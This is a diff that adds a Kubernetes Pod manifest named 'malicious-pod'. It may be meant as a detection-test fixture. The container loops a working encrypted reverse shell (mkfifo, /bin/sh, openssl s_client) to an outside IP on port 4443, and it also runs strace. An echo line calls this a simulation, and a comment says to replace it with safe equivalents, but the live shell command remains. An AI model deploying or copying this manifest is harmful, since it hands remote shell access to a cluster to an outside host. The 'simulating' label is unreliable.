@@ -1,0 +1,30 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: malicious-pod
+  labels:
+    app: malicious
+spec:
+  containers:
+  - name: malicious-container
+    image: ubuntu:22.04
+    command: ["/bin/dash"]
+    args:
+    - "-c"
+    - |
+      while true; do
+        echo "Simulating reverse shell to attacker c2 at 4443"
+        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 45.55.129.130:4443 > /tmp/s; rm /tmp/s
+        strace ls
+        # Remember to replace these with safe equivalents or log statements
+        sleep 90
+      done
+    resources:
+      limits:
+        cpu: "1"
+        memory: "512Mi"
+      requests:
+        cpu: "0.5"
+        memory: "256Mi"
+
+
